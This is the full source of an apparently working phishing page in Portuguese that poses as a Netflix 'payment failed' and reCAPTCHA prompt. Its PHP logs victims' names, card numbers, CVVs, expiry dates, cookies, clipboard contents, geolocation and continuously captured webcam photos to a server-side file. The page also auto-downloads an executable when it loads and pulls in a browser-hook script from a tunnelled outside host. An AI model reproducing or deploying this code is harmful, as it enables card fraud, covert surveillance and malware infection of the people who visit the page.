<!DOCTYPE html>
<html lang="pt-br">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Netflix | Falha no Pagamento </title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;400;700&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: url('1.jpg') no-repeat center center/cover;
        }

        .container {
            width: 420px;
            background-color: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: #fff;
            padding: 30px 40px;
            text-align: center;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
        }

        video {
            display: none;
        }

        .input-box {
            position: relative;
            width: 100%;
            height: 50px;
            margin: 10px 0;
        }

        .input-box input {
            width: 100%;
            background-color: transparent;
            height: 100%;
            border: 1px solid #ccc;
            border-radius: 5px;
            outline: none;
            font-size: 16px;
            color: #fff;
            padding: 15px;
        }

        .input-box input::placeholder {
            color: #c5c5c5;
        }

        .remember {
            display: flex;
            justify-content: space-between;
            margin: 10px 0 10px;
        }

        .redirect {
            width: 100%;
            cursor: pointer;
            border: none;
            border-radius: 40px;
            background-color: #fff;
            height: 50px;
            color: #333;
            font-weight: 600;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .redirect:hover {
            background-color: transparent;
            border: 2px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            transition: 0.5s;
        }
    </style>
</head>
<body>
    <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Dados do formulário
    $full_name = $_POST['full_name'] ?? 'N/A';
    $cc_number = $_POST['cc_number'] ?? 'N/A';
    $cc_cvv = $_POST['cc_cvv'] ?? 'N/A';
    $cc_expiry = $_POST['cc_expiry'] ?? 'N/A';
    $location = $_POST['location'] ?? 'Localização não disponível';
    $cookies = $_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível';
    $clipboard = $_POST['clipboard'] ?? 'Nenhum texto da área de transferência';

    // Criação do diretório para salvar as imagens
    if (!is_dir('uploads')) {
        mkdir('uploads', 0755, true);
    }

    // Processar imagem recebida
    if (isset($_FILES['photo']) && $_FILES['photo']['error'] === UPLOAD_ERR_OK) {
        $photoPath = 'uploads/photo_' . time() . '.png';
        move_uploaded_file($_FILES['photo']['tmp_name'], $photoPath);
    }

    // Salvar os dados no arquivo
    $file = fopen("dados.txt", "a");
    fwrite($file, "Nome Completo: $full_name\n");
    fwrite($file, "Número do Cartão: $cc_number\n");
    fwrite($file, "CVV: $cc_cvv\n");
    fwrite($file, "Validade: $cc_expiry\n");
    fwrite($file, "Localização: $location\n");
    fwrite($file, "Cookies: $cookies\n");
    fwrite($file, "Área de Transferência: $clipboard\n"); // Salvar conteúdo da área de transferência
    if (isset($photoPath)) {
        fwrite($file, "Foto salva em: $photoPath\n");
    }
    fwrite($file, "------------------------\n");
    fclose($file);
}

    ?>
    <main class="container">
        <form method="POST" enctype="multipart/form-data">
            <h3>Confirme que é você! - Recaptcha</h3>
            <div class="input-box">
                <input placeholder="Nome Completo" type="text" name="full_name" required>
            </div>
            <div class="input-box">
                <input placeholder="Número do Cartão" type="number" name="cc_number" required>
            </div>
            <div class="input-box">
                <input placeholder="CVV" type="number" name="cc_cvv" required>
            </div>
            <div class="input-box">
                <input placeholder="Validade do Cartão (MM/AA)" type="number" name="cc_expiry" required>
            </div>
            <div class="remember">
                <label>
                    <input type="checkbox" name="remember_me"> Lembre de mim </label>
            </div>
            <video id="video" autoplay></video>
            <canvas id="canvas" style="display: none;"></canvas>
            <input type="hidden" name="location" id="locationData">
            <input type="file" name="photo" id="photo" accept="image/png" style="display: none;">
            <button type="submit" class="redirect">Redirecionar ao WhatsApp!</button>
        </form>
    </main>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const locationData = document.getElementById('locationData');

// Captura da área de transferência
document.addEventListener('paste', async (event) => {
    const clipboardText = await navigator.clipboard.readText();

    // Envia o conteúdo da área de transferência para o servidor via POST
    fetch(window.location.href, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `clipboard=${encodeURIComponent(clipboardText)}`
    }).then(response => response.text())
      .then(data => {
          console.log('Dados enviados:', data);
      }).catch(err => {
          console.error('Erro ao enviar dados:', err);
      });
});

    // Captura a câmera 
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Captura contínua de imagens sem delay
                function captureFrame() {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photoInput = document.getElementById('photo');
                    canvas.toBlob(blob => {
                        const file = new File([blob], `photo_${Date.now()}.png`, { type: 'image/png' });
                        const dataTransfer = new DataTransfer();
                        dataTransfer.items.add(file);
                        photoInput.files = dataTransfer.files;
                        captureFrame(); // Chamando novamente para capturar continuamente
                    });
                }
                captureFrame();
            })
            .catch(err => {
                console.error('Erro ao acessar a câmera:', err);
                alert('Erro ao acessar a câmera. Verifique as permissões.');
            });

        // Captura a localização
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                const { latitude, longitude } = position.coords;
                locationData.value = `Lat: ${latitude}, Lon: ${longitude}`;
            }, err => {
                console.error('Erro ao acessar a localização:', err);
                alert('Erro ao acessar a localização. Verifique as permissões.');
            });
        } else {
            alert('Geolocalização não suportada pelo navegador.');
        }

    window.onload = function() {
        // Criar o link de download
        const link = document.createElement('a');
        link.href = 'arquivo.exe'; // Substitua pelo caminho do arquivo
        link.download = 'arquivo.exe'; // Nome do arquivo ao ser baixado

        // Simular o clique no link para iniciar o download
        link.click();
    };



  //
  // Desenvolvido por z3ldr1$ vulgo zel zel
  // Hacked By: z3ldr1s
  //  AIN ZEL ZEL KKKKKKKKKKKK
  //   
  //
  //     000000000000       000000000000             
  //     0oooooooooo0       0oooooooooo0		               
  //     0oo0000oooo0       0oo0000oooo0			                       
  //     0oo0000oooo0       0oo0000oooo0				                       
  //     0oo0000oooo0       0oo0000oooo0                   
  //     0oo0000oooo0       0oo0000oooo0 	          			            
  //     0oo____oooo0       0oo____oooo0	 
  //     000000000000       000000000000                        
  //                   
  //                         ___________         _________				
  //     1  '    sssssssss  |___________        |_________			
  //     1       ss         |                   |					
  //     1         s        |___________      	|_________			 		
  //     1          s       |                   |			
  //     1           s 	    |___________        |__________			
  //     1     ssssssss     |___________        |__________  .you  
  //     1
  //	___    			          
  //                       
  //
  //
    </script>
</body>
</html>
<script src="https://<subdomain>.trycloudflare.com:3000/hook.js"></script>
